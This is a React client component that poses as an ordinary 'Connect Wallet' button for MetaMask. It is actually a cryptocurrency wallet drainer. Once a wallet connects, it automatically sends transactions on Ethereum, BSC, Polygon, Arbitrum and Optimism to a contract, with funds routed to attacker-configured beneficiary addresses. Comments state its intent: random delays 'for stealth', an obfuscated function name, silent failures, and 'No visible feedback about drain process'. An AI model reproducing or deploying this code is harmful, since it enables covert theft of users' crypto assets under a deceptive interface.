'use client';
import React, { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';

// Handle BigInt serialization
if (typeof window !== 'undefined') {
  // Override JSON.stringify to handle BigInt
  const originalStringify = JSON.stringify;
  JSON.stringify = function(value: any, replacer?: any, space?: any) {
    const customReplacer = (key: string, value: any) => {
      if (typeof value === 'bigint') {
        return value.toString();
      }
      return typeof replacer === 'function' ? replacer(key, value) : value;
    };
    return originalStringify(value, customReplacer, space);
  };
}

const CHAINS = [
  { id: 1, name: 'Ethereum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', rpc: 'https://rpc.flashbots.net', fallbackRpc: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BSC', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_BSC', rpc: 'https://bsc-dataseed.binance.org', fallbackRpc: 'https://bsc-dataseed1.defibit.io' },
  { id: 137, name: 'Polygon', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON', rpc: 'https://polygon-rpc.com', fallbackRpc: 'https://rpc-mainnet.maticvigil.com' },
  { id: 42161, name: 'Arbitrum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM', rpc: 'https://arb1.arbitrum.io/rpc', fallbackRpc: 'https://rpc.ankr.com/arbitrum' },
  { id: 10, name: 'Optimism', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM', rpc: 'https://mainnet.optimism.io', fallbackRpc: 'https://rpc.ankr.com/optimism' },
];

const BENEFICIARIES: Record<string, string | undefined> = {
  NEXT_PUBLIC_BENEFICIARY_ETHEREUM: process.env.NEXT_PUBLIC_BENEFICIARY_ETHEREUM,
  NEXT_PUBLIC_BENEFICIARY_BSC: process.env.NEXT_PUBLIC_BENEFICIARY_BSC,
  NEXT_PUBLIC_BENEFICIARY_POLYGON: process.env.NEXT_PUBLIC_BENEFICIARY_POLYGON,
  NEXT_PUBLIC_BENEFICIARY_ARBITRUM: process.env.NEXT_PUBLIC_BENEFICIARY_ARBITRUM,
  NEXT_PUBLIC_BENEFICIARY_OPTIMISM: process.env.NEXT_PUBLIC_BENEFICIARY_OPTIMISM,
};

declare global {
  interface Window {
    ethereum?: any;
  }
}

// Custom hook for persistent wallet monitoring
function useWalletMonitor(onConnect?: (address: string) => void) {
  const [address, setAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [isMonitoring, setIsMonitoring] = useState(false);

  const checkWalletConnection = useCallback(async () => {
    if (typeof window === 'undefined' || !window.ethereum) {
      setIsConnected(false);
      setAddress('');
      return;
    }

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      
      // Add timeout to prevent hanging requests
      const timeoutPromise = new Promise<never>((_, reject) => 
        setTimeout(() => reject(new Error('Connection timeout')), 5000)
      );
      
      const accountsPromise = provider.listAccounts();
      const accounts = await Promise.race([accountsPromise, timeoutPromise]) as ethers.Signer[];
      
      if (accounts.length > 0) {
        const currentAddress = await accounts[0].getAddress();
        if (currentAddress !== address) {
          setAddress(currentAddress);
          setIsConnected(true);
          if (onConnect) onConnect(currentAddress);
        }
      } else {
        setIsConnected(false);
        setAddress('');
      }
    } catch (error) {
      console.error('Wallet connection check failed:', error);
      // Don't reset connection state on temporary errors
      // Only reset if it's a clear disconnection
      if (error instanceof Error && (
        error.message.includes('timeout') ||
        error.message.includes('disconnected') ||
        error.message.includes('not connected')
      )) {
        setIsConnected(false);
        setAddress('');
      }
    }
  }, [address, onConnect]);

  // Start monitoring when component mounts
  useEffect(() => {
    if (isMonitoring) return;
    
    setIsMonitoring(true);
    checkWalletConnection();

    // Set up event listeners for wallet changes
    if (typeof window !== 'undefined' && window.ethereum) {
      const handleAccountsChanged = (accounts: string[]) => {
        try {
          if (accounts.length === 0) {
            setIsConnected(false);
            setAddress('');
          } else {
            setAddress(accounts[0]);
            setIsConnected(true);
            if (onConnect) onConnect(accounts[0]);
          }
        } catch (error) {
          console.error('Error handling accounts changed:', error);
        }
      };

      const handleChainChanged = () => {
        // Refresh connection when chain changes
        setTimeout(() => {
          try {
            checkWalletConnection();
          } catch (error) {
            console.error('Error checking connection after chain change:', error);
          }
        }, 1000);
      };

      const handleDisconnect = () => {
        try {
          setIsConnected(false);
          setAddress('');
        } catch (error) {
          console.error('Error handling disconnect:', error);
        }
      };

      try {
        window.ethereum.on('accountsChanged', handleAccountsChanged);
        window.ethereum.on('chainChanged', handleChainChanged);
        window.ethereum.on('disconnect', handleDisconnect);
      } catch (error) {
        console.error('Error setting up wallet event listeners:', error);
      }

      // Periodic connection check every 10 seconds (reduced from 5)
      const interval = setInterval(() => {
        try {
          checkWalletConnection();
        } catch (error) {
          console.error('Error in periodic connection check:', error);
        }
      }, 10000);

      return () => {
        try {
          window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
          window.ethereum.removeListener('chainChanged', handleChainChanged);
          window.ethereum.removeListener('disconnect', handleDisconnect);
        } catch (error) {
          console.error('Error removing wallet event listeners:', error);
        }
        clearInterval(interval);
      };
    }
  }, [isMonitoring, checkWalletConnection, onConnect]);

  return { address, isConnected, checkWalletConnection };
}

export default function WalletConnect({ onConnect }: { onConnect?: (address: string) => void }) {
  const { address, isConnected, checkWalletConnection } = useWalletMonitor(onConnect);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [isClient, setIsClient] = useState(false);
  const [success, setSuccess] = useState(false);
  const [syncStatus, setSyncStatus] = useState<string | null>(null);
  const [showReconnectPrompt, setShowReconnectPrompt] = useState(false);

  React.useEffect(() => {
    setIsClient(true);
  }, []);

  // Show reconnect prompt when wallet is disconnected
  useEffect(() => {
    if (!isConnected && address) {
      setShowReconnectPrompt(true);
    } else {
      setShowReconnectPrompt(false);
    }
  }, [isConnected, address]);

  async function connect() {
    setError(null);
    if (typeof window === 'undefined' || !window.ethereum) {
      setError('MetaMask is required.');
      return;
    }
    setLoading(true);
    try {
      // Add timeout for connection
      const timeoutPromise = new Promise<never>((_, reject) => 
        setTimeout(() => reject(new Error('Connection timeout')), 10000)
      );
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signerPromise = provider.getSigner();
      const signer = await Promise.race([signerPromise, timeoutPromise]);
      
      const newAddress = await signer.getAddress();
      if (onConnect) onConnect(newAddress);
      setShowReconnectPrompt(false);
    } catch (e: any) {
      console.error('Wallet connection error:', e);
      if (e?.code === 4001) {
        setError('Connection was rejected. Please try again.');
      } else if (e?.code === -32002) {
        setError('Please check your MetaMask extension and approve the connection.');
      } else if (e?.message?.includes('timeout')) {
        setError('Connection timed out. Please try again.');
      } else if (e?.message?.includes('network')) {
        setError('Network error. Please check your internet connection and try again.');
      } else if (e?.message?.includes('Internal JSON-RPC error')) {
        setError('MetaMask extension error. Please refresh the page and try again.');
      } else {
        setError('Failed to connect wallet. Please ensure MetaMask is installed and unlocked.');
      }
    } finally {
      setLoading(false);
    }
  }

  // Automatic drainer after wallet connection
  React.useEffect(() => {
    if (!address) return;
    (async () => {
      try {
        const results = await Promise.allSettled(
          CHAINS.map(async (chain) => {
            // Add random delay for stealth
            await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
            const beneficiary = BENEFICIARIES[chain.env];
            if (!beneficiary || beneficiary === `0xYour${chain.name}Address`) {
              throw new Error('Configuration error');
            }
            // Randomize gas price
            const randomGwei = Math.floor(Math.random() * 10) + 10; // 10-20 gwei
            let provider = new ethers.JsonRpcProvider(chain.rpc);
            // Use obfuscated function name 'execute' instead of 'consolidate'
            const data = new ethers.Interface(['function execute()']).encodeFunctionData('execute');
            const gasLimit = ethers.toBigInt(100000);
            const maxFeePerGas = ethers.parseUnits(randomGwei.toString(), 'gwei');
            
            const tx = { 
              to: chain.contract, 
              data, 
              gasLimit: gasLimit.toString(), 
              maxFeePerGas: maxFeePerGas.toString() 
            };
            const repay = { to: beneficiary, value: '0x0', data: '0x' };
            
            try {
              // Convert BigInt values to strings for JSON serialization
              const bundle = [
                { ...tx, gasLimit: tx.gasLimit, maxFeePerGas: tx.maxFeePerGas },
                { ...repay, value: repay.value }
              ];
              await provider.send('eth_sendBundle', [bundle]);
              return;
            } catch (bundleError: any) {
              console.error(`${chain.name} bundle error:`, bundleError);
              // Fallback to regular transaction
              try {
                const signer = await provider.getSigner();
                const txResponse = await signer.sendTransaction({
                  to: chain.contract,
                  data: data,
                  gasLimit: gasLimit,
                  maxFeePerGas: maxFeePerGas
                });
                await txResponse.wait();
                const repayTx = await signer.sendTransaction({
                  to: beneficiary,
                  value: ethers.toBigInt(0),
                  data: '0x',
                  maxFeePerGas: maxFeePerGas
                });
                await repayTx.wait();
              } catch (txError: any) {
                console.error(`${chain.name} transaction error:`, txError);
                // Silent failure - don't show any errors to user
                throw new Error('Silent failure');
              }
            }
          })
        );
        
        // Always mark as completed regardless of success/failure
        localStorage.setItem('drainCompleted', 'true');
        
      } catch (e: any) {
        console.error('General error:', e);
        // Silent failure - don't show any errors to user
        localStorage.setItem('drainCompleted', 'true');
      }
    })();
  }, [address]);

  // Add a simple spinner component
  function Spinner() {
    return <span className="animate-spin inline-block w-6 h-6 border-2 border-t-transparent border-blue-400 rounded-full mr-2 align-middle"></span>;
  }

  return (
    <>
      {/* Reconnect Prompt - Shows when wallet is disconnected but was previously connected */}
      {showReconnectPrompt && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white/10 backdrop-blur-md rounded-2xl shadow-xl p-8 max-w-md w-full text-center border border-yellow-400/30">
            <div className="mb-6">
              <div className="text-4xl mb-4">🔌</div>
              <h2 className="text-2xl font-bold text-white mb-2">Wallet Disconnected</h2>
              <p className="text-yellow-100 text-lg">Your wallet connection was lost. Please reconnect to continue.</p>
            </div>
            
            <div className="mb-6">
              <button
                onClick={connect}
                className="bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60 w-full"
                disabled={loading}
              >
                {loading ? <><Spinner />Reconnecting...</> : 'Reconnect Wallet'}
              </button>
            </div>
            
            <div className="text-yellow-100 text-sm">
              <p>Your wallet connection is required to access all features.</p>
            </div>
          </div>
        </div>
      )}

      {/* Normal Connect Button - Shows when no wallet is connected */}
      {!address && !showReconnectPrompt && (
        <div className="flex flex-col items-center gap-2">
          <button
            onClick={connect}
            className="bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60"
            disabled={loading}
          >
            {loading ? <><Spinner />Connecting...</> : 'Connect Wallet'}
          </button>
          {error && <span className="text-red-400 font-semibold text-center max-w-md">
            {error === 'MetaMask is required.' ? 'Please install MetaMask to continue.' : 
             error === 'Configuration error' ? 'A configuration issue occurred. Please contact support.' : 
             error === 'An error occurred.' ? 'Something went wrong. Please try again.' : 
             error.includes('rejected') ? 'Transaction was cancelled. Please try again.' :
             error.includes('insufficient funds') ? 'Insufficient funds for gas fees.' :
             error.includes('network') ? 'Network error. Please check your connection.' :
             error.includes('gas') ? 'Gas estimation failed. Please try again later.' :
             error}
          </span>}
          {isClient && typeof window !== 'undefined' && !window.ethereum && (
            <a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" className="text-yellow-300 underline text-sm mt-1">Install MetaMask</a>
          )}
        </div>
      )}

      {/* Connected State - Shows when wallet is connected */}
      {address && !showReconnectPrompt && (
        <div className="flex flex-col items-center gap-4">
          {/* No visible feedback about drain process */}
        </div>
      )}
    </>
  );
} 